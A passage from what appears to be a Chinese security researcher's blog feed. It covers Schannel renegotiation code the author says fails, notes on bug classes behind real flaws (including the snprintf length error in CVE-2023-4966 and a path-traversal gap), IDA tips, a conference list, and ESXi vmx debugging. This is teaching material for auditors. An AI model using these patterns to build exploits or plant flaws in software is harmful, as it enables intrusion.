接收client发来的加密hello消息</span></span><br><span class="line">        Server_Socket,</span><br><span class="line">        g_pInBuf,</span><br><span class="line">        g_cbMaxMessage,</span><br><span class="line">        &amp;cbIn))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>(FALSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SecBuffer security_buffers[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    SecBufferDesc security_buffers_desc;</span><br><span class="line">    security_buffers[<span class="number">0</span>].BufferType = SECBUFFER_DATA;</span><br><span class="line">    security_buffers[<span class="number">0</span>].pvBuffer = g_pInBuf;</span><br><span class="line">    security_buffers[<span class="number">0</span>].cbBuffer = cbIn;</span><br><span class="line">    security_buffers[<span class="number">1</span>].BufferType = SECBUFFER_EMPTY;</span><br><span class="line">    security_buffers[<span class="number">2</span>].BufferType = SECBUFFER_EMPTY;</span><br><span class="line">    security_buffers[<span class="number">3</span>].BufferType = SECBUFFER_EMPTY;</span><br><span class="line"></span><br><span class="line">    security_buffers_desc.cBuffers = <span class="keyword">sizeof</span>(security_buffers) / <span class="keyword">sizeof</span>(security_buffers[<span class="number">0</span>]);</span><br><span class="line">    security_buffers_desc.pBuffers = security_buffers;</span><br><span class="line">    security_buffers_desc.ulVersion = SECBUFFER_VERSION;</span><br><span class="line"></span><br><span class="line">    Status = DecryptMessage(&amp;hctxt, &amp;security_buffers_desc, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Status != SEC_I_RENEGOTIATE) &#123;<span class="comment">// 解密后应该是SEC_I_RENEGOTIATE消息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SecBuffer* pDataBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    SecBuffer* pExtraBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pDataBuffer == <span class="literal">NULL</span> &amp;&amp; security_buffers[i].BufferType == SECBUFFER_DATA) &#123;</span><br><span class="line">            pDataBuffer = &amp;security_buffers[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pExtraBuffer == <span class="literal">NULL</span> &amp;&amp; security_buffers[i].BufferType == SECBUFFER_EXTRA) &#123;</span><br><span class="line">            pExtraBuffer = &amp;security_buffers[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//----------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">//  Prepare output buffers.</span></span><br><span class="line"></span><br><span class="line">    OutBuffDesc.ulVersion = SECBUFFER_VERSION;</span><br><span class="line">    OutBuffDesc.cBuffers = <span class="number">1</span>;</span><br><span class="line">    OutBuffDesc.pBuffers = OutSecBuff;</span><br><span class="line"></span><br><span class="line">    OutSecBuff[<span class="number">0</span>].cbBuffer = <span class="number">0</span>;</span><br><span class="line">    OutSecBuff[<span class="number">0</span>].BufferType = SECBUFFER_TOKEN;</span><br><span class="line">    OutSecBuff[<span class="number">0</span>].pvBuffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//OutSecBuff[1].cbBuffer = 0;</span></span><br><span class="line">    <span class="comment">//OutSecBuff[1].BufferType = SECBUFFER_EMPTY;</span></span><br><span class="line">    <span class="comment">//OutSecBuff[1].pvBuffer = NULL;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">//  Prepare input buffers.</span></span><br><span class="line"></span><br><span class="line">    InBuffDesc.ulVersion = SECBUFFER_VERSION;</span><br><span class="line">    InBuffDesc.cBuffers = <span class="number">2</span>;</span><br><span class="line">    InBuffDesc.pBuffers = InSecBuff;</span><br><span class="line"></span><br><span class="line">    InSecBuff[<span class="number">0</span>].cbBuffer = pExtraBuffer-&gt;cbBuffer;</span><br><span class="line">    InSecBuff[<span class="number">0</span>].BufferType = SECBUFFER_TOKEN;</span><br><span class="line">    InSecBuff[<span class="number">0</span>].pvBuffer = pExtraBuffer-&gt;pvBuffer;</span><br><span class="line">    InSecBuff[<span class="number">1</span>].cbBuffer = <span class="number">0</span>;</span><br><span class="line">    InSecBuff[<span class="number">1</span>].BufferType = SECBUFFER_EMPTY;</span><br><span class="line">    InSecBuff[<span class="number">1</span>].pvBuffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Token buffer received (%lu bytes):\n&quot;</span>, InSecBuff[<span class="number">0</span>].cbBuffer);</span><br><span class="line">    PrintHexDump(InSecBuff[<span class="number">0</span>].cbBuffer, (PBYTE)InSecBuff[<span class="number">0</span>].pvBuffer);</span><br><span class="line"></span><br><span class="line">    Status = AcceptSecurityContext( </span><br><span class="line">        &amp;hcred,</span><br><span class="line">        &amp;hctxt,</span><br><span class="line">        &amp;InBuffDesc,</span><br><span class="line">        dwSSPIFlags,</span><br><span class="line">        SECURITY_NATIVE_DREP,<span class="comment">// not used according doc</span></span><br><span class="line">        &amp;hctxt,</span><br><span class="line">        &amp;OutBuffDesc,</span><br><span class="line">        &amp;dwSSPIFlags,</span><br><span class="line">        &amp;Lifetime);</span><br><span class="line"><span class="comment">// 这里会出错, 不清楚原因.</span></span><br><span class="line">    <span class="keyword">if</span> (Status &amp; <span class="number">0x80000000</span>) &#123;</span><br><span class="line">        LogError(<span class="string">&quot;fail to say hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>这段代码应该是这么写的, 但是我自己跑的时候, 在第二次的<code>AcceptSecurityContext</code>会遇到解密错误, 暂时不清楚原因, 但是网络上又找不到相关的实现做一个参考, 所以列出来希望对人有帮助.</p><p>参考:</p><p><a href="https://microsoft.public.platformsdk.security.narkive.com/4xhIBWZi/schannel-and-session-renegotiation">Schannel and Session Renegotiation </a></p><p><a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/renegotiating-an-schannel-connection">Renegotiating an Schannel Connection</a></p><h2 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h2><p>获取某个git项目下的依赖git项目: <code>git submodule update --init --recursive</code></p><p><code>cmake -DXXXX=ON ./</code> 表示开启XXXX特性, 生成makefile. XXXX特性由CMakeLists.txt定义, 形式如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">option(suppress_header_searches &quot;do not try to find headers - used when compiler check will fail&quot; OFF)</span><br></pre></td></tr></table></figure><p>表示接受参数<code>-Dsuppress_header_searches=ON</code>, 默认是<code>OFF</code>.</p><p>生成makefile后, 执行<code>cmake --build .</code>编译</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;blockquote&gt;
&lt;p&gt;不定期更新&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;两个linux文件互传&quot;&gt;&lt;a href=&quot;#两个linux文件互传&quot; class=&quot;headerlink&quot; title=&quot;两个lin</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Bug 实用技巧</title>
    <link href="http://474172261.github.io/2023/02/22/bug-skills/"/>
    <id>http://474172261.github.io/2023/02/22/bug-skills/</id>
    <published>2023-02-22T11:54:44.212Z</published>
    <updated>2024-08-02T10:14:08.848Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>记录一些有意思的bug成因, 积攒经验值. 不定期更新</p></blockquote><h2 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> src[<span class="number">9</span>] = <span class="string">&quot;bbbbbbbb&quot;</span>;</span><br><span class="line"><span class="type">char</span> dst[<span class="number">8</span>] = <span class="string">&quot;aaaaaa&quot;</span>;</span><br><span class="line"><span class="type">int</span> l = <span class="built_in">snprintf</span>(dst, <span class="number">0x5</span>, <span class="string">&quot;%s&quot;</span>, src);</span><br><span class="line"><span class="keyword">return</span> l;</span><br></pre></td></tr></table></figure><p>一般来说, 这段代码是不会造成安全问题的, 因为并不能溢出dst, 而且函数会自动添加<code>\0</code>截断, 所以也不存在越界读取非0字节的问题. </p><p>但是, snprintf的返回值是不截断的长度! 也就是返回了<code>8</code>.</p><p>实际例子就是 <code>CVE-2023-4966</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iVar3 = <span class="built_in">snprintf</span>(print_temp_rule,<span class="number">0x20000</span>,</span><br><span class="line">               <span class="string">&quot;&#123;\&quot;issuer\&quot;: \&quot;https://%.*s\&quot;, \&quot;authorization_endpoint\&quot;: \&quot;https://%.*s/oauth/ idp/login\&quot;, \&quot;token_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/token\&quot;, \&quot;jwks_uri\&quot;:  \&quot;https://%.*s/oauth/idp/certs\&quot;, \&quot;response_types_supported\&quot;: [\&quot;code\&quot;, \&quot;toke n\&quot;, \&quot;id_token\&quot;], \&quot;id_token_signing_alg_values_supported\&quot;: [\&quot;RS256\&quot;], \&quot;end _session_endpoint\&quot;: \&quot;https://%.*s/oauth/idp/logout\&quot;, \&quot;frontchannel_logout_sup ported\&quot;: true, \&quot;scopes_supported\&quot;: [\&quot;openid\&quot;, \&quot;ctxs_cc\&quot;], \&quot;claims_support ed\&quot;: [\&quot;sub\&quot;, \&quot;iss\&quot;, \&quot;aud\&quot;, \&quot;exp\&quot;, \&quot;iat\&quot;, \&quot;auth_time\&quot;, \&quot;acr\&quot;, \&quot;amr \&quot;, \&quot;email\&quot;, \&quot;given_name\&quot;, \&quot;family_name\&quot;, \&quot;nickname\&quot;], \&quot;userinfo_endpoin t\&quot;: \&quot;https://%.*s/oauth/idp/userinfo\&quot;, \&quot;subject_types_supported\&quot;: [\&quot;public\&quot;]&#125;&quot;</span></span><br><span class="line">               ,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8);</span><br><span class="line">authv2_json_resp = <span class="number">1</span>;</span><br><span class="line">iVar3 = ns_vpn_send_response(param_1,<span class="number">0x100040</span>,print_temp_rule,iVar3);</span><br></pre></td></tr></table></figure><p>这里将<code>iVar3</code>作为响应的长度, 导致越界读取了额外的内存, 从而send响应时造成信息泄露.</p><p>参考链接: <a href="https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966">https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966</a></p><h2 id="wcsncpy-s-dst-dstlen-src-srclen"><a href="#wcsncpy-s-dst-dstlen-src-srclen" class="headerlink" title="wcsncpy_s(dst,dstlen,src,srclen)"></a>wcsncpy_s(dst,dstlen,src,srclen)</h2><p>这是个安全拷贝函数, 但是它内部实现(msvcrt.dll)有个异常, 如果<code>dstlen &lt;= srclen, 且src的字符串长度大于等于dstlen</code>, 就会导致崩溃异常.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> src[<span class="number">9</span>] = <span class="string">L&quot;bbbbbb&quot;</span>;</span><br><span class="line"><span class="type">wchar_t</span> dst[<span class="number">8</span>] = <span class="string">L&quot;aaaaaaa&quot;</span>;</span><br><span class="line"><span class="type">int</span> l = wcsncpy_s(dst, <span class="number">0x6</span>, src, <span class="number">6</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>这段代码我们就看不到输出”ok”</p><h2 id="PathCanonicalize"><a href="#PathCanonicalize" class="headerlink" title="PathCanonicalize"></a>PathCanonicalize</h2><p>函数功能是拼接windows的文件路径, 并移除<code>..\</code>, 但是它不会移除<code>../</code>, 如果不正确使用, 存在路径超越问题.</p><p>参考案例: 议题 <a href="https://github.com/474172261/slides/blob/main/Old%20School%2C%20New%20Story--Escape%20from%20Hyper-V%20by%20Path%20Traversal.pdf">Old School, New Story–Escape from Hyper-V by Path Traversal </a></p><h2 id="strnicmp-wcsnicmp"><a href="#strnicmp-wcsnicmp" class="headerlink" title="strnicmp, wcsnicmp"></a>strnicmp, wcsnicmp</h2><p>这类函数有长度限制, 可能错误匹配. 比如 strnicmp(“abc”,”abc123”, 3) 就能通过匹配.</p><h1 id="IDA-技巧"><a href="#IDA-技巧" class="headerlink" title="IDA 技巧"></a>IDA 技巧</h1><h2 id="结构体字段命名"><a href="#结构体字段命名" class="headerlink" title="结构体字段命名"></a>结构体字段命名</h2><p>在定义结构体时, 可以在字段命名中添加关键词, 方便审计时提高注意力.</p><p><code>lock1_</code>开头, 表示字段的操作需要上锁.</p><p><code>a_</code>开头, 表示字段是个数组.</p><p><code>_14h</code>结尾, 标识字段在结构体中的偏移, 方便调试时识别.</p><p>选择变量, <code>create new struct type...</code>创建结构体时, 如果有符号名称, 可以直接命名成那个名称, 这样有的函数有识别类型的时候, 会自动识别, 省去手动标识.</p><blockquote><p>注意, 如果是c++的代码, 往往子类和父类名称一样, 导致类型识别错误. 需要自行辨别当前的类型应该是父类还是子类.</p><p>比如代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*((_DWORD *)<span class="keyword">this</span> + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line"> *(_QWORD *)<span class="keyword">this</span> = &amp;CWSDSession::`vftable<span class="number">&#x27;</span>&#123;<span class="keyword">for</span> `IWSDSessionInternal<span class="number">&#x27;</span>&#125;;</span><br><span class="line"> v1 = (<span class="type">char</span> *)<span class="keyword">this</span> + <span class="number">80</span>;</span><br><span class="line"> *((_DWORD *)<span class="keyword">this</span> + <span class="number">13</span>) = <span class="number">1</span>;</span><br><span class="line"> *((_QWORD *)<span class="keyword">this</span> + <span class="number">1</span>) = &amp;CWSDSession::`vftable<span class="number">&#x27;</span>&#123;<span class="keyword">for</span> `IWSDMessageBusNotify<span class="number">&#x27;</span>&#125;;</span><br><span class="line"> v2 = <span class="number">31</span>i64;</span><br><span class="line"> *((_QWORD *)<span class="keyword">this</span> + <span class="number">3</span>) = <span class="number">0</span>i64;</span><br><span class="line"> *((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>) = <span class="number">0</span>i64;</span><br><span class="line"> *((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) = <span class="number">0</span>i64;</span><br><span class="line"> *((_DWORD *)<span class="keyword">this</span> + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line"> *((_QWORD *)<span class="keyword">this</span> + <span class="number">7</span>) = <span class="number">0</span>i64;</span><br><span class="line"> *((_QWORD *)<span class="keyword">this</span> + <span class="number">8</span>) = <span class="number">0</span>i64;</span><br></pre></td></tr></table></figure><p>很明显是两个类, 一个类的virtual table 是 <code>IWSDMessageBusNotify</code>, 一个是 <code>IWSDSessionInternal</code>.</p><p>因此, 先以this创建结构体, 假设名为<code>a1</code>, </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">a1</span>&#123;</span></span><br><span class="line">    _QWORD field_0;</span><br><span class="line">    _QWORD field_8;</span><br><span class="line">    ....</span><br><span class="line">     _QWORD field_40;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后取+8开始字段, 创建新结构体, 假设命名成<code>a2</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">a2</span>&#123;</span></span><br><span class="line">    _QWORD field_8;</span><br><span class="line">    ....</span><br><span class="line">    _QWORD field_40;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将a1重新修改为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">a1</span>&#123;</span></span><br><span class="line">    _QWORD field_0h;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">a2</span> <span class="title">field_8h</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后遇到引用子类的函数时, 也好处理了.</p></blockquote><h1 id="会议参考"><a href="#会议参考" class="headerlink" title="会议参考"></a>会议参考</h1><p>有时候想发议题了, 发现议题cfp结束了, 就很无语, 列一下我知道会议(毕竟了解的不多, 有遗漏的话, 只是因为我了解的不够多, 还望见谅), 以后可以关注一下</p><table><thead><tr><th>会议名称</th><th>2024年举办时间</th><th>举办地点</th><th>CFP截止日期</th><th>演讲支持</th><th>备注</th></tr></thead><tbody><tr><td><a href="https://www.secwest.net/">CanSecWest</a></td><td>3&#x2F;20</td><td>加拿大</td><td>2023&#x2F;12&#x2F;30</td><td>演讲费不详+差旅住宿</td><td>一个会场</td></tr><tr><td><a href="https://zer0con.org/">Zer0Con</a></td><td>4&#x2F;4</td><td>韩国</td><td>3&#x2F;5</td><td>$2000+差旅住宿</td><td>硬核</td></tr><tr><td><a href="https://www.blackhat.com/">Black Hat Asia</a></td><td>4&#x2F;17</td><td>新加坡</td><td>2023&#x2F;12&#x2F;22</td><td>$1000+差旅住宿</td><td>多个会场(如果感兴趣议题冲突, 就无法都看)</td></tr><tr><td><a href="https://typhooncon.com/">TyphoonCon</a></td><td>5&#x2F;30</td><td>韩国</td><td>3&#x2F;1</td><td>演讲费不详+差旅住宿</td><td></td></tr><tr><td><a href="https://cfp.offensivecon.org/">OffensiveCon</a></td><td>5&#x2F;10</td><td>德国柏林</td><td>4&#x2F;2</td><td>演讲费1000欧元+差旅住宿</td><td>硬核</td></tr><tr><td><a href="https://www.geekcon.top/">GeekCon</a></td><td>5&#x2F;25</td><td>不固定(24年新加坡)</td><td>4&#x2F;20</td><td>$1200+差旅住宿</td><td></td></tr><tr><td><a href="https://offbyone.sg/">OffByOne</a></td><td>6&#x2F;26</td><td>新加坡</td><td>3&#x2F;2</td><td>演讲费不详+差旅住宿</td><td></td></tr><tr><td><a href="https://recon.cx/">REcon</a></td><td>6&#x2F;28</td><td>加拿大</td><td>4&#x2F;26</td><td>$1000演讲费+差旅住宿</td><td></td></tr><tr><td><a href="https://www.blackhat.com/">Black Hat USA</a></td><td>8&#x2F;7</td><td>美国洛杉矶</td><td>4&#x2F;10</td><td>$1000演讲费+差旅住宿</td><td></td></tr><tr><td><a href="https://conference.hitb.org/">HITBSecConf BangKok</a></td><td>8&#x2F;29</td><td>曼谷</td><td>4&#x2F;30</td><td>演讲费不详+差旅住宿</td><td>hitb 有多个会议, 这里是其中一个, 不同会议时间和地点都不一样</td></tr><tr><td><a href="https://powerofcommunity.net/">PoC</a></td><td>11月</td><td>韩国</td><td>10&#x2F;15</td><td>不详</td><td></td></tr><tr><td><a href="https://www.blackhat.com/">Black Hat Euro</a></td><td>12&#x2F;9</td><td>英国伦敦</td><td>不确定</td><td>$1000演讲费+差旅住宿</td><td></td></tr><tr><td><a href="https://cfp.hexacon.fr/">hexacon</a></td><td>10&#x2F;4</td><td>法国巴黎</td><td>6月或者5月</td><td>不确定</td><td></td></tr><tr><td><a href="https://hitcon.org/">HITCON</a></td><td>8&#x2F;19</td><td>台湾</td><td>不确定</td><td>不确定</td><td></td></tr><tr><td><a href="https://mosec.org/">MOSEC</a></td><td>11月</td><td>上海</td><td>不清楚</td><td>不清楚</td><td></td></tr></tbody></table><p>其它的我觉得和我想象的技术会议有点不太一样, 有兴趣的可以自己关注一下, 比如: <a href="https://forum.defcon.org/search?searchJSON=%7B%22tag%22:%5B%22cfp%22%5D%7D">DEFCON</a>, <a href="https://www.infosecurityeurope.com/">InfoSec</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;blockquote&gt;
&lt;p&gt;记录一些有意思的bug成因, 积攒经验值. 不定期更新&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;snprintf&quot;&gt;&lt;a href=&quot;#snprintf&quot; class=&quot;headerli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>在ESXi中调试运行虚拟机的vmx程序(How to debug vmx in ESXi)</title>
    <link href="http://474172261.github.io/2023/02/22/debug_vmx_in_esxi/"/>
    <id>http://474172261.github.io/2023/02/22/debug_vmx_in_esxi/</id>
    <published>2023-02-22T11:54:44.181Z</published>
    <updated>2023-03-08T10:25:02.091Z</updated>
    
    <content type="html"><![CDATA[<p>ESXi自带一个子linux系统, 虽然能实现一部分功能, 但是目前为止, 依然没有公开的教程说过如何调试vmx进程, 本篇教程将分享我的研究成果, 帮助大家轻松调试虚拟机进程.</p><span id="more"></span><h2 id="最简单的方法"><a href="#最简单的方法" class="headerlink" title="最简单的方法"></a>最简单的方法</h2><p>首先, ESXi 自带一个gdbserver, 所以最简单的方法就是直接跑起程序, 再用gdbserver attach它. (最好用老一点的gdb, 比如gdb 7.8)</p><ol><li><p>跑起虚拟机, 查看vmx对应的进程id</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@192:~] ps|grep vmx</span><br><span class="line">70639  70639  vmx</span><br><span class="line">70643  70639  vmx-vthread-706</span><br><span class="line">70644  70639  vmx-filtPoll:c7</span><br><span class="line">70645  70639  vmx-mks:c7</span><br><span class="line">70646  70639  vmx-svga:c7</span><br><span class="line">70647  70639  vmx-vcpu-0:c7</span><br></pre></td></tr></table></figure></li><li><p>gdbserver attach 上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@192:~] gdbserver --attach :8808 70639</span><br><span class="line">Attached; pid = 70639</span><br><span class="line">!gdb_connected()</span><br><span class="line">!gdb_connected()</span><br><span class="line">!gdb_connected()</span><br><span class="line">!gdb_connected()</span><br><span class="line"></span><br><span class="line">[root@192:~] gdbserver --attach :8808 70639</span><br><span class="line">Attached; pid = 70639</span><br><span class="line">!gdb_connected()</span><br><span class="line">Listening on port 8808</span><br></pre></td></tr></table></figure><p>一定要保证出现<code>Listening on port</code>, 不然 ctrl+c 中断, 再重试就好, 目标进程不受影响.</p></li><li><p>找一台可以使用gdb的机器, 把ESXi中的vmx文件拷贝到机器中, 然后使用如下命令连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@192 vv]<span class="comment"># gdb -q</span></span><br><span class="line">gdb$ file Desktop/vmx-7.0-15843807.elf </span><br><span class="line">Reading symbols from /home/vv/Desktop/vmx-7.0-15843807.elf...Missing separate debuginfo <span class="keyword">for</span> /home/vv/Desktop/vmx-7.0-15843807.elf</span><br><span class="line">(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gdb$ target remote 192.168.170.240:8808</span><br><span class="line">Remote debugging using 192.168.170.240:8808</span><br><span class="line">=&gt; 0x8ce2771248 &lt;__libc_ifunc_impl_list+3304&gt;:cmp    rax,0xfffffffffffff000</span><br><span class="line">   0x8ce277124e &lt;__libc_ifunc_impl_list+3310&gt;:ja     0x8ce2771275 &lt;__libc_ifunc_impl_list+3349&gt;</span><br><span class="line"></span><br><span class="line">gdb$ </span><br></pre></td></tr></table></figure><p>这样就可以正常调试了</p></li></ol><h2 id="另一种方法-使用自己编译好的gdb"><a href="#另一种方法-使用自己编译好的gdb" class="headerlink" title="另一种方法-使用自己编译好的gdb"></a>另一种方法-使用自己编译好的gdb</h2><p>如果自带的gdbserver 不太好用, 那也可以自己源码静态编译一个gdb版本拷贝过去, 然后直接用.</p><ol><li><p>自己源码编译一个gdb, 或者用我编译好的<a href="/otherfile/gdb7_8.xz">gdb7.8 no python</a> 拷贝到esxi上</p><blockquote><p>如果要自己编译支持带python的gdb, 先下载python源码. 使用<code>./configure --prefix=/home/vv/python; make; make install</code> 编译安装python到&#x2F;home&#x2F;vv&#x2F;python. </p><p>然后下载gdb源码, 安装lzma开发组件<code>yum xz-devel texinfo</code>, 使用<code>./configure --prefix=/home/vv/gdb --enable-static --with-python=/home/vv/Desktop/python --with-lzma;make</code> 编译, 成功后<code>make install</code> 安装. 其它操作参考gdb10.2里给出的脚本.</p></blockquote><p>如果想编译11.0之后的gdb, 需要做一下修改, 修改如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> target_xfer_status</span><br><span class="line"><span class="title function_">linux_nat_target::xfer_partial</span> <span class="params">(<span class="keyword">enum</span> target_object object,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="type">char</span> *annex, gdb_byte *readbuf,</span></span><br><span class="line"><span class="params"><span class="type">const</span> gdb_byte *writebuf,</span></span><br><span class="line"><span class="params">ULONGEST offset, ULONGEST len, ULONGEST *xfered_len)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (object == TARGET_OBJECT_MEMORY)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">-      <span class="keyword">return</span> linux_proc_xfer_memory_partial (readbuf, writebuf,</span><br><span class="line">-     offset, len, xfered_len);</span><br><span class="line">+       <span class="class"><span class="keyword">enum</span> <span class="title">target_xfer_status</span> <span class="title">ret</span> =</span> linux_proc_xfer_memory_partial (readbuf, writebuf,</span><br><span class="line">+     offset, len, xfered_len);</span><br><span class="line">+      <span class="keyword">if</span>(ret == TARGET_XFER_OK)&#123;<span class="keyword">return</span> ret;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> inf_ptrace_target::xfer_partial (object, annex, readbuf, writebuf,</span><br><span class="line">  offset, len, xfered_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>在11.0之后的版本读取目标进程内存时, 默认从&#x2F;proc&#x2F;pid&#x2F;mem读取,  而esxi上是没有这个文件的, 所以, 除非修改它的实现, 否则之后的版本不适合在esxi上用.</p><p>最好还是用7.8的版本, 否则容易有奇奇怪怪的问题</p></blockquote></li><li><p>运行起虚拟机</p></li><li><p>运行gdb, 一般会告诉你缺失libtinfo.so.5文件或者libncurses.so.5, 最简单的方法就是创建一个软链接, 把它自带的一个文件软链接成缺失的文件.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@192:~] <span class="built_in">ln</span> -s /lib64/libncurses.so.5 /lib64/libtinfo.so.5</span><br></pre></td></tr></table></figure><p>或者从centos 7 3.10内核的系统中拷贝一个过去放在lib64目录下.</p></li><li><p>使用gdb调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb$ file /bin/vmx</span><br><span class="line">gdb$ <span class="built_in">set</span> architecture i386:x86-64:intel</span><br><span class="line">gdb$ attach xxxxx</span><br></pre></td></tr></table></figure></li></ol><p>以下是编译的带python 2.7 的gdb7.8的分块包(因为github最大支持25M), 可以通过<code>cat gdb78_p.tar.xz.* &gt; gdb10.2.tar.xz</code> 合并他们</p><p><a href="/otherfile/gdb78_p.tar.xz.s0">gdb78_p.tar.xz.s0</a> </p><p><a href="/otherfile/gdb78_p.tar.xz.s1">gdb78_p.tar.xz.s1</a></p><p><a href="/otherfile/gdb78_p.tar.xz.s2">gdb78_p.tar.xz.s2</a>  </p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>如果发现ctrl+c不好使, 